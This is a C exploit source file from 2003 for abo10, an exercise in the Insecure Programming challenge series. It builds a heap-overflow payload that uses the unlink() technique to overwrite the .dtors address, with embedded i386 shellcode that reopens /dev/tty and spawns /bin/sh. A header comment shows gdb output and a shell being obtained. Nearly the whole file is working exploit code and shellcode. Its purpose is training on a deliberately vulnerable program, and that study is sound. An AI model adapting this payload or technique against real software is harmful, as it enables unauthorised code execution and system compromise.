/*
 * $Id: abo10-ex2.c,v 1.1.1.1 2003/10/15 17:27:57 raptor Exp $
 *
 * abo10-ex2.c - abo10.c exploit (.dtors)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * See http://community.core-sdi.com/~gera/InsecureProgramming/
 * See also abo9+mod-ex.c for details about unlink() technique.
 *
 * This is the buffer structure (we don't put our shellcode in envp):
 * [SC] [Ax(256-strlen(SC)] [FAKE_SIZE] [FAKE_SIZE] [JUNK] [DTORS] [ret]
 *
 * $ ./abo10-ex2 | ./abo10
 * Using .dtors address: 0x80495D8
 * Using ret: 0x8049640
 * sh-2.05a$ 
 *
 * $ objdump -j .dtors -s abo10
 * [...]
 * Contents of section .dtors:
 *  80495d4 ffffffff 00000000                    ........        
 *  ^^^^^^^\__(add 4 to get the correct address)
 *
 * $ perl -e 'print "ABCD"x66' > foo
 * $ ./abo10 <foo 
 * Segmentation fault
 * $ gdb ./abo10 -q
 * (gdb) set arg <foo
 * (gdb) r
 * Starting program: /home/raptor/devel/abo10 <foo
 * 
 * Program received signal SIGSEGV, Segmentation fault.
 * 0x4008a433 in free () from /lib/libc.so.6
 * (gdb) p &buf
 * $1 = (<data variable, no debug info> *) 0x8049640
 * (gdb)                                   ^^^^^^^^^\__(this is the buf addr)
 *
 * NOTE: shellcode is modified, 'cause (retaddr + 8) is being written to
 * by unlink() and the content there will be destroyed. So we need to jump
 * at least 12 bytes ahead, over the destroyed content. Moreover, gets()
 * is a bit harder to exploit than strcpy(), 'cause our buffer must not
 * contain newline ('\x0a') or end-of-file characters. Finally, we need to
 * close and re-open stdin to execute /bin/sh correctly (gets() locks it).
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define JUNK		0xdeadbeef	// size field of fake chunk
#define	FAKE_SIZE	0xfffffffc	// -4 (PREV_INUSE = 0)
#define BUF		277		// 256 + (4 * 5) + 1
#define DTORS		0x080495d8	// .dtors section address
#define	RET		0x08049640 	// address of buf

char sc[] = /* linux/i386 shellcode (13 + 8 + 23 + 24  = 68 bytes) */
/* jmp 11 ('\x0a' is '\n') */
"\xeb\x0bWHO_CARES??"
/* close(0) */
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
/* open("/dev/tty", O_RDWR | ...) */
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
/* execve("/bin/sh", ["/bin/sh"], NULL) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
	char buf[BUF];
	int i, dtors_addr = DTORS, ret = RET;

	/* address pointer */
	char *ap = buf;

	fprintf(stderr, "Using .dtors address: 0x%X\n", dtors_addr);
	fprintf(stderr, "Using ret: 0x%X\n", ret);

	/* pad the buffer */
	memset(ap, 'A', 256);
	ap += 256;

	/* prev_size field of chunk */
	*((void **)ap) = (void *)(FAKE_SIZE);
	ap += 4;

	/* size field of chunk (prev_size field of fake chunk) */
	*((void **)ap) = (void *)(FAKE_SIZE);
	ap += 4;

	/* size field of fake chunk */
	*((void **)ap) = (void *)(JUNK);
	ap += 4;

	/* fd field of chunk */
	*((void **)ap) = (void *)(dtors_addr - 12);
	ap += 4;

	/* bk field of chunk */
	*((void **)ap) = (void *)(ret);
	ap += 4;

	/* terminate our buffer */
	*ap = 0x0;

	/* put the shellcode at buf address */
	for (i = 0; i < strlen(sc); i++)
		buf[i] = sc[i];

	/* output the evil string */
	printf("%s", buf);
}
